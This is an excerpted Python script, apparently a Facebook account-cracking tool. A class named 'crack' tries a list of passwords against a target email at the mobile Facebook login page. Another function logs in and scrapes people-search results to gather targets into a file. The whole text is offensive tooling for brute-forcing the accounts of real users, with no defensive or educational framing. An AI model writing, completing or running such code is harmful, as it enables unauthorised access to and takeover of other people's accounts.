...
class crack:
	...
	def main(self,fl):
		try:
			for i in self.pw:
				r=requests.Session()
				r.get("https://m.facebook.com/login")
				...
				b=r.post("https://m.facebook.com/login", data={"email":fl,"pass":i}).url
...
def dumpfl():
	r=requests.Session()
	r.get("https://free.facebook.com/login")
	r.headers.update({"User-Agent":"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36"})
	r.post("https://free.facebook.com/login", data={"email":raw_input("?: email: "),"pass":raw_input("?: passs: ")}).url
	if "c_user" in r.cookies.get_dict():
		fl=raw_input("?: filename: ")
		s=raw_input("?: search query: ")
		search(fl,r,"https://free.facebook.com/search/people/?q="+s)
